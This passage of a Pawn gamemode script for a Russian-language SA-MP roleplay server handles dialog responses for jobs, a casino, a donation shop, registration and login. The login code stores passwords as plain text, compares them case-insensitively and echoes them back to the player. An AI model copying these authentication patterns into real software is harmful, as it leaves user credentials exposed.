				SetBizzInt(i, "product", BizzInfo[i][bProduct]);
				ShowSTODialog(playerid);
				SaveVehicleTuning(playerid);
				SendClientMessage(playerid,COLOR_WHITE,"Вы купили эту запчасть");
			}
			else
			{
				ShowSTODialog(playerid);
				SendClientMessage(playerid,COLOR_WHITE,"Вы отменили покупку");
				RemoveVehicleComponent(GetPlayerVehicleID(playerid),GetPVarInt(playerid,"ComponentCTO"));
				if(PlayerInfo[playerid][cVehcoms][0]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][0]);
				if(PlayerInfo[playerid][cVehcoms][1]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][1]);
				if(PlayerInfo[playerid][cVehcoms][2]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][2]);
				if(PlayerInfo[playerid][cVehcoms][3]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][3]);
				if(PlayerInfo[playerid][cVehcoms][4]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][4]);
				if(PlayerInfo[playerid][cVehcoms][5]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][5]);
				if(PlayerInfo[playerid][cVehcoms][6]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][6]);
				if(PlayerInfo[playerid][cVehcoms][7]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][7]);
				if(PlayerInfo[playerid][cVehcoms][8]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][8]);
				if(PlayerInfo[playerid][cVehcoms][9]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][9]);
				if(PlayerInfo[playerid][cVehcoms][10]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][10]);
				if(PlayerInfo[playerid][cVehcoms][11]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][11]);
				if(PlayerInfo[playerid][cVehcoms][12]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid), PlayerInfo[playerid][cVehcoms][12]);
				if(PlayerInfo[playerid][cVehcoms][13]!=0) AddVehicleComponent(GetPlayerVehicleID(playerid),PlayerInfo[playerid][cVehcoms][13]);
			}
		}
	case 6433: // касса
		{
			if(response)
			{
				if(!PlayerInJob[playerid])
				{
					SendClientMessage(playerid, COLOR_RED, "Вы не на работе");
					SendClientMessage(playerid, COLOR_RED, "Переоденьтесь в раздевалке чтобы начать работу");
					return true;
				}
				PlayerInJob[playerid] = 0;
				SetPlayerSkin(playerid, Oldskin2[playerid]);
				DisablePlayerCheckpoint(playerid);
				GiveMoney(playerid, Meshki[playerid]*50);
				format(string, 128, "{FFFAFA}Вы получили {228B22}%d$ {FFFAFA}за {A52A2A}%d {FFFAFA}ящика(ов)",Meshki[playerid]*50,Meshki[playerid]);
				SendClientMessage(playerid, COLOR_SYSTEM, string);
				Meshki[playerid] = 0;
			}
		}
	case D_FARM:
		{
			if(response)
			{
				if(GetPVarInt(playerid,"FarmDuty") == 1)
				{
					SendMes(playerid, COLOR_YELLOW, "Вы закончили рабочий день на ферме и получили %d$ за работу",GetPVarInt(playerid,"FarmMoneyEarned"));
					SetPlayerSkin(playerid, Oldskin2[playerid]);
					DisablePlayerCheckpoint(playerid);
					GiveMoney(playerid,GetPVarInt(playerid,"FarmMoneyEarned"));
					DeletePVar(playerid,"FarmDuty");
					DeletePVar(playerid,"FarmMoneyEarned");
					if(IsPlayerAttachedObjectSlotUsed(playerid,3)) RemovePlayerAttachedObject(playerid, 3);
					DeletePVar(playerid,"FarmSbor");
					return true;
				}
				else if(IsAFarmer(playerid))
				{
					SetPVarInt(playerid,"FarmDuty",1);
					SendClientMessage(playerid, COLOR_RED, "Вы начали рабочий день фермером");
					Oldskin2[playerid] = GetPlayerSkin(playerid);
					SetPlayerSkin(playerid, 34);
				}
				else
				{
					SetPVarInt(playerid,"FarmDuty",1);
					SendClientMessage(playerid, COLOR_RED, "Вы начали рабочий день");
					Oldskin2[playerid] = GetPlayerSkin(playerid);
					SetPlayerSkin(playerid, 32);
				}
			}
		}
	case 6435: 
		{
			if(response)
			{
				if(PlayerInJob[playerid])
				{
					SendClientMessage(playerid, COLOR_RED, "Вы уже на работе");
					SendClientMessage(playerid, COLOR_RED, "Если хотите закончить рабочий день, идите в кассу");
					return true;
				}
				PlayerInJob[playerid] = 1;
				Oldskin2[playerid] = GetPlayerSkin(playerid);
				SetPlayerSkin(playerid, 16);
				SetPVarInt(playerid,"pGruz",1);
				SetPlayerCheckpoint(playerid,2833.0859,-2496.3464,14.6081,1.5);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "На вашей карте отмечено место разгрузки ящиков");
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Идите к нему чтобы взять ящик");
			}
		}
	case 6446:
		{
			if(response)
			{
				if(pSportZal[playerid])
				{
					SendClientMessage(playerid, COLOR_RED, "Вы уже переоделись");
					return true;
				}
				pSportZal[playerid] = 1;
				Oldskin2[playerid] = GetPlayerSkin(playerid);
				SetPlayerSkin(playerid, 80);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "Вы начали тренировку, бейте по грушам!");
			}
			else
			{
				if(pSportZal[playerid])
				{
					pSportZal[playerid] = 0;
					SetPlayerSkin(playerid,Oldskin2[playerid]);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Вы закончили тренировку!");
				}
				else SendClientMessage(playerid, COLOR_LIGHTBLUE, "Вы не начинали тренировку!");
			}
		}
	case 2631:
		{
			if(response)
			{
				new Float:x2,Float:y2,Float:z2;
				GetPlayerPos(playerid,x2,y2,z2);
				foreach(new i:Player)
				{
					PlayAudioStreamForPlayer(i, inputtext, x2,y2,z2, 20, 1);
				}
			}
		}
 	case D_DONATE:
		{
			if(!response) return cmd_mm(playerid, inputtext);
			switch(listitem)
			{
			case 0:ShowPlayerDialog(playerid, D_DONATE+1, DIALOG_STYLE_LIST, "Вирты", "{03c03c}[50 DonateMoney]{ffffff} 100к\n{03c03c}[80 DonateMoney]{ffffff} 200к\n{03c03c}[300 DonateMoney]{ffffff} 5кк\n{03c03c}[500 DonateMoney]{ffffff} 10кк\n{03c03c}[900 DonateMoney]{ffffff} 20кк", "Выбрать", "Назад");
			case 1:ShowPlayerDialog(playerid, D_DONATE+2, DIALOG_STYLE_LIST, "Прокачка", "{03c03c}[200 DonateMoney]{ffffff}Получить все скилы оружий на 100%\n{03c03c}[200 DonateMoney]{ffffff}Получить все скилы драки\n{03c03c}[100 DonateMoney]{ffffff}Получить 2500 матов и 200 нарко\n{03c03c}[50 DonateMoney]{ffffff}Получить 100 законки\n", "Выбрать", "Назад");
			case 2:{
					if(PlayerInfo[playerid][pCredits] < 250) return SendClientMessage(playerid, COLOR_GREY, "{F70000}• {ADAEAD}Не достатчно рублей!");
                    PlayerInfo[playerid][pCredits] -= 250;
                    PlayerInfo[playerid][pVIP] = true;
					SendClientMessage(playerid, COLOR_YELLOW, "{F70000}• {ADAEAD} Вы купили VIP аккаунт, Спасибо за помощь серверу!");
				   }
			}
		}
 	case D_DONATE+1:
		{
			if(response)
			{
				switch(listitem)
				{
				case 0:
					{
						if(PlayerInfo[playerid][pCredits] < 50) return SendClientMessage(playerid, COLOR_GREY, "{F70000}• {ADAEAD}Не достатчно рублей!");
                        PlayerInfo[playerid][pCredits] -= 50;
						SendClientMessage(playerid, COLOR_YELLOW, "{F70000}• {ADAEAD} Вы купили 100000$ за 50 кредитов, Спасибо за помощь серверу!");
						GiveMoney(playerid,100000);
					}
				case 1:
					{
						if(PlayerInfo[playerid][pCredits] < 80) return SendClientMessage(playerid, COLOR_GREY, "{F70000}• {ADAEAD}Не достатчно рублей!");
                        PlayerInfo[playerid][pCredits] -= 80;
						SendClientMessage(playerid, COLOR_YELLOW, "{F70000}• {ADAEAD} Вы купили 200000$ за 80 кредитов, Спасибо за помощь серверу!");
						GiveMoney(playerid,200000);
					}
				case 2:
					{
						if(PlayerInfo[playerid][pCredits] < 300) return SendClientMessage(playerid, COLOR_GREY, "{F70000}• {ADAEAD}Не достатчно рублей!");
						PlayerInfo[playerid][pCredits] -= 300;
						SendClientMessage(playerid, COLOR_YELLOW, "{F70000}• {ADAEAD} Вы купили 1000000$ за 300 кредитов, Спасибо за помощь серверу!");
						GiveMoney(playerid,1000000);
					}
				case 3:
					{
						if(PlayerInfo[playerid][pCredits] < 500) return SendClientMessage(playerid, COLOR_GREY, "{F70000}• {ADAEAD}Не достатчно рублей!");
						PlayerInfo[playerid][pCredits] -= 500;
						SendClientMessage(playerid, COLOR_YELLOW, "{F70000}• {ADAEAD} Вы купили 2000000$ за 300 кредитов, Спасибо за помощь серверу!");
						GiveMoney(playerid,2000000);
					}
				case 4:
					{
						if(PlayerInfo[playerid][pCredits] < 900) return SendClientMessage(playerid, COLOR_GREY, "{F70000}• {ADAEAD}Не достатчно рублей!");
						PlayerInfo[playerid][pCredits] -= 900;
						SendClientMessage(playerid, COLOR_YELLOW, "{F70000}• {ADAEAD} Вы купили 8000000$ за 900 кредитов, Спасибо за помощь серверу!");
						GiveMoney(playerid,8000000);
					}
				}
			}
		}
	case D_DONATE+2:
		{
			if(response)
			{
				switch(listitem)
				{
				case 0:
					{
						if(PlayerInfo[playerid][pCredits] < 200) return SendClientMessage(playerid, COLOR_GREY, "{F70000}• {ADAEAD}Не достатчно рублей!");
						PlayerInfo[playerid][pGunSkill][0] = 100;
						PlayerInfo[playerid][pGunSkill][1]  = 100;
						PlayerInfo[playerid][pGunSkill][2]  = 100;
						PlayerInfo[playerid][pGunSkill][3]  = 100;
						PlayerInfo[playerid][pGunSkill][4]  = 100;
						PlayerInfo[playerid][pGunSkill][5]  = 100;
						SendClientMessage(playerid, COLOR_YELLOW, "{F70000}• {ADAEAD} Все ваши скиллы были прокачены, Спасибо за помощь серверу!");
						PlayerInfo[playerid][pCredits] -= 200;
					}
				case 1:
					{
						if(PlayerInfo[playerid][pCredits] < 200) return SendClientMessage(playerid, COLOR_GREY, "{F70000}• {ADAEAD}Не достатчно рублей!");
						PlayerInfo[playerid][pSportEXP] = 999999;
						SendClientMessage(playerid, COLOR_YELLOW, "{F70000}• {ADAEAD} Вам доступно (( /fstyle )), Спасибо за помощь серверу!");
						PlayerInfo[playerid][pCredits] -= 200;
					}
				case 2:
					{
						if(PlayerInfo[playerid][pCredits] < 100) return SendClientMessage(playerid, COLOR_GREY, "{F70000}• {ADAEAD}Не достатчно рублей!");
						PlayerInfo[playerid][pDrugs] += 200;
						PlayerInfo[playerid][pMats] += 2500;
						SendClientMessage(playerid, COLOR_YELLOW, "{F70000}• {ADAEAD} Вы получили 2500 матов и 200 наркотиков, Спасибо за помощь серверу!");
						PlayerInfo[playerid][pCredits] -= 100;
					}
				case 3:
					{
						if(PlayerInfo[playerid][pCredits] < 50) return SendClientMessage(playerid, COLOR_GREY, "{F70000}• {ADAEAD}Не достатчно рублей!");
						PlayerInfo[playerid][pZakon] = 100;
						SendClientMessage(playerid, COLOR_YELLOW, "{F70000}• {ADAEAD} Вы получили 100 законопослушности, Спасибо за помощь серверу!");
						PlayerInfo[playerid][pCredits] -= 50;
					}
				}
			}
			else
			{
				return true;
			}
		}
	case 1431:
		{
			if(response)
			{
				switch(listitem)
				{
				case 0:
					{
						PlayerInfo[playerid][pSkin1] = PlayerInfo[playerid][pModel];
						SendClientMessage(playerid,COLOR_GREEN,"Вы выбрали 1 полку для одежды! Переодеться можно дома (/hpanel)");
					}
				case 1:
					{
						PlayerInfo[playerid][pSkin2] = PlayerInfo[playerid][pModel];
						SendClientMessage(playerid,COLOR_GREEN,"Вы выбрали 2 полку для одежды! Переодеться можно дома (/hpanel)");
					}
				case 2:
					{
						PlayerInfo[playerid][pSkin3] = PlayerInfo[playerid][pModel];
						SendClientMessage(playerid,COLOR_GREEN,"Вы выбрали 3 полку для одежды! Переодеться можно дома (/hpanel)");
					}
				}
			}
			else	SendClientMessage(playerid,COLOR_GREEN,"Одежда будет на вас");
		}
	case 1212: // Казино
		{
			if(response)
			{
				if(PlayerInfo[playerid][pDrugs] >= 100) return SendClientMessage(playerid, COLOR_GREY, "У вас достаточно наркоты на руках!");
				new maximum = strval(inputtext);
				if(!strlen(inputtext))return ShowPlayerDialog(playerid,1212,DIALOG_STYLE_INPUT,"Покупка травы","Введите кол-во грамм которое вы хотите купить.","Купить","Отмена");
				if(GetMoney(playerid) < maximum*40) return ShowPlayerDialog(playerid,1212,DIALOG_STYLE_INPUT,"Покупка травы","Введите кол-во грамм которое вы хотите купить.","Купить","Отмена");
				if(maximum < 1 || maximum > 100) return ShowPlayerDialog(playerid,1212,DIALOG_STYLE_INPUT,"Покупка травы","Введите кол-во грамм которое вы хотите купить\nкол-во не должно превышать 300грамм.","Купить","Отмена");
				PlayerInfo[playerid][pDrugs] += maximum;
				GiveMoney(playerid, -maximum*40);
				// 991
				ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "{ffffff}Барыга:", "{ffffFF}Спасибо за покупку травы у нас.\nЗаходи еще скоро будет увеличен ассортимент.\nИспользуй {1E90FF}(/usedrugs) {ffffff}для употребления.", "Принять", "");
				return true;
			}
		}
	case 5576: // Казино
		{
			if(response)
			{
				new summa;
				if (RouletteStart[playerid] == true) return SendClientMessage(playerid, COLOR_GREY, "Вы уже сделали ставку!");
				summa = strval(inputtext);
				if(PlayerInfo[playerid][pCash] < summa) return SendClientMessage(playerid, COLOR_GREY, "У вас нет столько денег!");
				if(summa < 500 || summa > 100000) { SendClientMessage(playerid, COLOR_GREY, "Нельзя поставить меньше 500$ и больше 100.000$!"); return true; }
				//RuletTip[playerid] = 38;
				GiveMoney(playerid,-summa);
				RouletteSumm[playerid] = summa;
				RouletteStart[playerid] =true;
				DestroyObject(Fishka[playerid]);
				new x=random(4);
				switch(x)
				{
				case 0: Fishka[playerid] = CreateObject(1930,fishechkax[playerid],fishechkay[playerid],1006.0690,0.00,0.00,0.00);
				case 1: Fishka[playerid] = CreateObject(1931,fishechkax[playerid],fishechkay[playerid],1006.0690,0.00,0.00,0.00);
				case 2: Fishka[playerid] = CreateObject(1932,fishechkax[playerid],fishechkay[playerid],1006.0690,0.00,0.00,0.00);
				case 3: Fishka[playerid] = CreateObject(1933,fishechkax[playerid],fishechkay[playerid],1006.0690,0.00,0.00,0.00);
				}
				Upravakazino[playerid] =false;
				SendMes(playerid, COLOR_YELLOW,"Вы сделали ставку в размере %d долларов",summa);
			}
			else
			{
				CancelCasino(playerid);
			}
		}
	case 8600: // Казино
		{
			if(response)
			{
				if(CasinoDuty[playerid] == 1 )
				{
					SendClientMessage(playerid, COLOR_WHITE, "[Ошибка] Вы уже начали свой рабочий день!");
				}
				if(CasinoDuty[playerid] == 0)
				{
					if (PlayerInfo[playerid][pSex]== 1)
					{
						SendClientMessage(playerid, COLOR_GREEN, "Вы начали рабочий день в Казино Калигула!");
						SetPlayerSkin(playerid, 171);
						CasinoDuty[playerid] = 1;
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREEN, "Вы начали рабочий день в Казино Калигула!");
						SetPlayerSkin(playerid, 11);
						CasinoDuty[playerid] = 1;
					}
				}
			}
			else
			{
				if(CasinoDuty[playerid] == 0) return SendClientMessage(playerid, COLOR_WHITE, "Вы не начинали рабочий день!");
				CasinoDuty[playerid] = 0;
				SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
				SendClientMessage(playerid, COLOR_GREEN, "Вы закончили рабочий день в Казино Калигула!");
			}
		}
	case D_NULL: return true;
	case D_REGISTER:
		{
			for(new i = strlen(inputtext); i != 0; --i)
			switch(inputtext[i])
			{
			case 'А'..'Я', 'а'..'я', ' ':
				return SendClientMessage(playerid,COLOR_WHITE,"При вводе пароля используйте только английские буквы"), GKick(playerid);
			}
			if(response)
			{
				if(!strlen(inputtext) || strlen(inputtext) < 3 || strlen(inputtext) > 16 || IsTextRussian(inputtext))
				{
					format(string, 300, "{ffffff}Добро пожаловать на {1E90FF}"Namemode"\n{ffffff}Этот аккаунт не зарегистрирован.\n\nЛогин: {1E90FF}%s\n{ffffff}Введите пароль и нажмите \"Далее\".\n\nПримечания:\n- Пароль чувствителен к регистру.\n- Длина пароля от 4 до 16 символов.\n- В пароле можно использовать латинские символы.",PlayerInfo[playerid][pSendername]);
					ShowPlayerDialog(playerid, D_REGISTER, DIALOG_STYLE_INPUT, "{1E90FF}Регистрация", string, "Далее","Отмена");
				}
				else
				{
					strmid(PlayerInfo[playerid][pPassword], inputtext, 0, strlen(inputtext), 32);
					for(new i = 0; i != 10; ++i) SendClientMessage(playerid, COLOR_ORANGE, " ");
					SendMes(playerid, COLOR_ORANGE, "Ваш пароль от аккаунта: '%s', запомните его, и никому не говорите!", inputtext);
					SendClientMessage(playerid, COLOR_ORANGE, "Запомните, администрация сервера никогда не спросит ваш пароль");
					SetPlayerPos(playerid,552.3757,-1755.2257,32.5627);
					SetPlayerCameraPos(playerid,561.3472,-1729.2336,32.5403);
					SetPlayerCameraLookAt(playerid,537.3727,-1732.1235,31.4725);
					SendClientMessage(playerid, COLOR_ORANGE, "Пожалуйста, введите адрес вашей электронной почты");
					ShowPlayerDialog(playerid, D_JOB+30, 1, "{1E90FF}Электронная почта","{ffffff}Уважаемый игрок! Пожалуйста введите свой Email адрес\nЭто поможет вам восстановить доступ к своему аккаунту в случае его утери!\nЕсли вы не хотите указывать свой Email то оставьте поле пустым!", "Далее", "Отмена");
				}
			}
			else { SendClientMessage(playerid, COLOR_LIGHTRED, ""PlayerNeedToLoggedForToPlay""); GKick(playerid); }
		}
	case D_LOGIN:
		{

			for(new i = strlen(inputtext); i != 0; --i)
			switch(inputtext[i])
			{
			case 'А'..'Я', 'а'..'я', ' ':
				return ShowPlayerDialog(playerid,D_ERRORPAS,DIALOG_STYLE_MSGBOX,"{FF0000}Ошибка!","{66CC33}Смените раскладку клавиатуры с русского на английский","Повторить","");
			}
			if(response)
			{
				if(!strlen(inputtext))
				{
					format(string, 256, "{ffffff}Добро пожаловать на {1E90FF}"Namemode"\n{ffffff}Этот аккаунт зарегистрирован.\n\n{ffffff}Логин: {1E90FF}%s\n{ffffff}Ваш Пинг: {daa520}%d\n{ffffff}Введите ваш пароль:",PlayerInfo[playerid][pSendername],GetPlayerPing(playerid));
					ShowPlayerDialog(playerid, D_LOGIN, 3, "{FF9900}Авторизация", string, "Принять","Отмена");
				}
				else if(!strcmp(inputtext, GetAccount(PlayerInfo[playerid][pSendername], "password"), true))
				{
					new ipcheckon = strval(GetAccount(PlayerInfo[playerid][pSendername], "ipcheck"));
					new pip[32];
					GetPlayerIp(playerid,pip,sizeof(pip));
					if(ipcheckon == 1 && !strcmp(pip, GetAccount(PlayerInfo[playerid][pSendername], "ippassword"), true))
					{
						format(string, 256, "Проверка по IP включена, введите пароль IP!",PlayerInfo[playerid][pSendername]);
						ShowPlayerDialog(playerid, 12341, 3, "{FF9900}Проверка IP Включена", string, "Принять","Отмена");
					}
					else
					{
						LoadAccount(playerid);
					}
					return true;
				}
				else
				{
					new logtires = 3 - PlayerLogTries[playerid];
					PlayerLogTries[playerid]++;
					if(PlayerLogTries[playerid] == 4) { SendClientMessage(playerid,COLOR_LIGHTRED, "Вы были кикнуты по подозрению в взломе {ffffff}/q(uit)"); GKick(playerid); }
					format(string,128,"{FF6347}Внимание! Вы ввели неверный пароль!\nУ вас осталось %d попытки\nПосле вы будете кикнуты",logtires);
					ShowPlayerDialog(playerid, D_ERRORPAS,DIALOG_STYLE_MSGBOX,"{FF6347}Ошибка",string,"Повтор","Выйти");

				}
			}
			else { SendClientMessage(playerid, COLOR_LIGHTRED, ""PlayerNeedToLoggedForToPlay""); GKick(playerid); }
		}
	case 12341:
		{

			for(new i = strlen(inputtext); i != 0; --i)
			switch(inputtext[i])
			{
			case 'А'..'Я', 'а'..'я', ' ':
				return ShowPlayerDialog(playerid,12341,DIALOG_STYLE_MSGBOX,"{FF0000}Ошибка!","{66CC33}Смените раскладку клавиатуры с русского на английский","Повторить","");
			}
			if(response)
			{
				if(!strlen(inputtext))
				{
					format(string, 256, "Проверка по IP включена, введите пароль!",PlayerInfo[playerid][pSendername]);
					ShowPlayerDialog(playerid, 12341, 3, "{FF9900}Проверка IP Включена", string, "Принять","Отмена");
				}
				else if(!strcmp(inputtext, GetAccount(PlayerInfo[playerid][pSendername], "ippassword"), true))
				{
					LoadAccount(playerid);
					return true;
				}
				else
				{
					GKick(playerid);
				}
			}
			else { SendClientMessage(playerid, COLOR_LIGHTRED, ""PlayerNeedToLoggedForToPlay""); GKick(playerid); }
		}
	case D_ERRORPAS:
		{
			if(!response) { SendClientMessage(playerid, COLOR_LIGHTRED, ""PlayerNeedToLoggedForToPlay""); GKick(playerid); }
			format(string, 256, "{ffffff}Добро пожаловать на {1E90FF}"Namemode"\n{ffffff}Этот аккаунт зарегистрирован.\n\n{ffffff}Логин: {1E90FF}%s\n{ffffff}Ваш Пинг: {daa520}%d\n{ffffff}Введите ваш пароль:",PlayerInfo[playerid][pSendername],GetPlayerPing(playerid));
			ShowPlayerDialog(playerid, D_LOGIN, 3, "{FF9900}Авторизация", string, "Принять","Отмена");
		}
	case D_SEX:
		{
			new sex[20];
			switch(response)
			{
			case 1: { sex = "Мужской"; PlayerInfo[playerid][pSex] = 1; }
			default: { sex = "Женский" ; PlayerInfo[playerid][pSex] = 2; }
			}
			ClothesRound[playerid] = 1;
			PlayerLogged[playerid] = true;
			SendMes(playerid, COLOR_ORANGE, "Ваш пол: {ffffff}'%s'", sex);
			SendClientMessage(playerid, COLOR_YELLOW, ""PlayerNeedToChooseSkin"");
			SetHealth(playerid, 70);
			SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 0, 0, 0, 1.0, -1, -1, -1, -1, -1, -1);
			SpawnPlayer(playerid);
		}
	case 14212:
		{
			if(!response) return cmd_mm(playerid,inputtext);
			switch(listitem)
			{
			case 0: ShowPlayerDialog(playerid, 13212, DIALOG_STYLE_INPUT, "{FF9900}Отправка Жалобы", "Введите ID нарушителя и причину\nПример: 31, ДМ\nЗа оффтоп вы будете наказаны", "Отправить","Назад");
			case 1: ShowPlayerDialog(playerid, 13214, DIALOG_STYLE_INPUT, "{FF9900}Задать вопрос", "Сформулируйте вопрос четко и кратко\nИ введите его в окошко\n\nЗа оффтоп последует наказание", "Отправить","Назад");
			}
		}
	case D_MAINMENU:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: ShowPlayerDialog(playerid, 12232, DIALOG_STYLE_LIST, "Статистика персонажа", "{FFFFFF}[1] {00FF00}Основная статистика{FFFFFF}\n[2] Навык вождения\n[3] Сытость\n[4] Лицензии", "Принять", "Назад");
			case 1: ShowPlayerDialog(playerid, 14212, DIALOG_STYLE_LIST, "Выберите тип запроса", "<1> \t\tЖалоба\n<2> {00FF00}\t\tВопрос", "Отправить","Назад");
			case 2:
				{
					format(totalstring, 512, "Чат семьи\t\t\t%s\nЧат администратора\t\t%s\nОчистить чат\nСмена пола\nСмена имени\nСмена пароля\nПроверка по IP \t\t%s",(!SendFamily[playerid]) ? ("{9ACD32}Выключена") : ("{FF6347}Включена"),(!SendAdmin[playerid]) ? ("{9ACD32}Включить") : ("{FF6347}Выключить"),(!PlayerInfo[playerid][ProverkaIP]) ? ("{9ACD32}Включить") : ("{FF6347}Выключить"));
					ShowPlayerDialog(playerid, D_JOB+17, 2, "Настройки", totalstring, "Принять", "Отмена");
				}
			case 3: ShowPlayerDialog(playerid, D_COMMANDSERVER, DIALOG_STYLE_LIST,
				"Команды сервера", "Основные\nДля администрации\nУправление домом\nУправление бизнесом\nУправление личным авто\nПо работе\nДля лидеров\nКоманды мэрии\nКоманды полиции и ФБР\
				\nКоманды Армии\nКоманды инструкторов\nКоманды новостей\
				\nКоманды центрального банка\nКоманды казино Caligua's \nКоманды банд\nКоманды мафий\nФерма", "Принять", "Отмена");
			case 4: ShowPlayerDialog(playerid, D_JOB+20, 1, "Смена ника", "Введите будущий ник\n\nВнимание! Мы меняем только Non-RP ники", "Принять", "Отмена");
			case 5: ShowPlayerDialog(playerid, 8543, DIALOG_STYLE_LIST, "Полезная информация", "Где заработать денег?\nКак поднять уровень?\nГде выучить RP правила и термины\nКак стать администратором?", "Читать", "Назад");
			case 6: cmd_sradio(playerid, inputtext), cmd_mm(playerid, inputtext);
			case 7: ShowPlayerDialog(playerid, D_DONATE, DIALOG_STYLE_LIST, "{66CC33}Донат {FFFFFF}- основное меню", "• Рубли в игровые деньги\n• Прокачка аккаунта\n• Купить VIP аккуант", "Далее", "Отмена");
		    }
       }
	case 8544: ShowPlayerDialog(playerid, 8543, DIALOG_STYLE_LIST, "Полезная информация", "Где заработать денег?\nКак поднять уровень?\nГде выучить RP правила и термины\nКак стать администратором?", "Читать", "Назад");
	case 8543:
		{
			if(!response) return cmd_mm(playerid,inputtext);
			switch(listitem)
			{
			case 0:
				{
					ShowPlayerDialog(playerid, 8544, DIALOG_STYLE_MSGBOX, "Где заработать денег?", "Первым делом можно пойти на нелегальные работы:\nФерма, Грузчики, Шахтеры, Развочик металла, сборщик оружия\nПосле достижения 2-5 уровня:\nВодителем автобуса, Таксистом, Механиком, Развозчиком\nТак же можно пойти в организацию\nВы можете накопить на свой бизнес, и получать с него прибыль", "Назад", "");
				}
			case 1:
				{
					ShowPlayerDialog(playerid, 8544, DIALOG_STYLE_MSGBOX, "Как поднять 'уровень'?", "Каждый час вам начисляется по 1 респекту\nЧто бы перейти на следующий уровень, нужно:\nНабрать число респектов, умноженное на 8\nПример: \nДля получения второго уровня нужно: 8 респектов (2x4) \nДля получения третьего уровня нужно: 12 респектов (3x4)", "Назад", "");
				}
			case 2:
				{
					ShowPlayerDialog(playerid, 8544, DIALOG_STYLE_MSGBOX, "Где узнать всю информацию о сервере?", "Вся информация о сервере, правила, термины и FAQ есть на нашем сайте:\n"Namesite"", "Назад", "");
				}
			case 3:
				{
					ShowPlayerDialog(playerid, 8544, DIALOG_STYLE_MSGBOX, "Как стать администратором?", "Правило сервера 2.6: Просьбы о выдаче админки запрещены\n\nАдминистрация смотрит за каждым игроком сервера\nВ случае набора администрации на сервер\nМы сами найдем вас, и пригласим вас в свою команду!", "Назад", "");
				}
			}
		}
	case 12232:
		{
			if(!response) return cmd_mm(playerid,inputtext);
			switch(listitem)
			{
			case 0:
				{
					Stats(playerid, playerid);
				}
			case 1:
				{
					cmd_carskill(playerid,inputtext);
				}
			case 2:
				{
					cmd_satiety(playerid,inputtext);
				}
			case 3:
				{
					cmd_licenses(playerid,inputtext);
				}
			}
		}
	case 13212:
		{
			if(!response) return ShowPlayerDialog(playerid, 14212, DIALOG_STYLE_LIST, "Выберите тип запроса", "<1> \t\tЖалоба\n<2> {00FF00}\t\tВопрос", "Отправить","Назад");
			if(GetPVarInt(playerid,"AntiFloodRep") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "На отправку жалобы существует лимит времени, пожалуйста подождите.");
			format(string, 128, "[A] [R] Жалоба от %s (ID: %d): %s",PlayerInfo[playerid][pSendername],playerid,inputtext);
			SendAdminMessage(COLOR_GREEN, string);
			SendClientMessage(playerid, COLOR_ORANGE, "Ваша жалоба была успешно отправлена! Спасибо за помощь серверу.");
			SetPVarInt(playerid,"AntiFloodRep",gettime() + 5);
		}
	case 13214:
		{
			if(!response) return ShowPlayerDialog(playerid, 14212, DIALOG_STYLE_LIST, "Выберите тип запроса", "<1> \t\tЖалоба\n<2> {00FF00}\t\tВопрос", "Отправить","Назад");
			if(GetPVarInt(playerid,"AntiFloodRep") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Вопрос можно задать раз в 10 секунд.");
			format(string, 128, "[A] [R] Вопрос от %s (ID: %d): %s",PlayerInfo[playerid][pSendername],playerid,inputtext);
			SendAdminMessage(COLOR_LIGHTGREEN, string);
			SendClientMessage(playerid, COLOR_ORANGE, "Ваш вопрос был отправлен администрации! Ожидайте ответа.");
			SetPVarInt(playerid,"AntiFloodRep",gettime() + 10);
		}
	case D_COMMANDSERVER:
		{
			cmd_mm(playerid, inputtext);
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					SendClientMessage(playerid, COLOR_BLUE, "Основные команды "Namemode":");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/me /do /try /s /b /o /en /li /id /time /report /skill /spawnchange");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/sradio /satiety /carskill /wank /piss /sprunk /smoke");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/ad /eject /pdd /pay /atm /radio /dice /gps /clist /leaders /stopfish");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/divorce /propose /showpass /licenses /showlicenses /togphone /animlist");
					SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/instructors /usedrugs /dropdrugs /ainfo /call /sms /phone /admins /picklist /getbizstats /fish");
				}
			case 1:
				{
					if(PlayerInfo[playerid][pAdmin] < 0) SendClientMessage(playerid, COLOR_GREY, YouCanNot);
					SendClientMessage(playerid, COLOR_BLUE, "Администратору [A]:");
					if(PlayerInfo[playerid][pAdmin] >= 1) SendClientMessage(playerid, COLOR_BLUE, "<> {9ACD32}/a /rr /afk /spec /specoff /kick /slap /mute /vehid /setsex /gotopos");
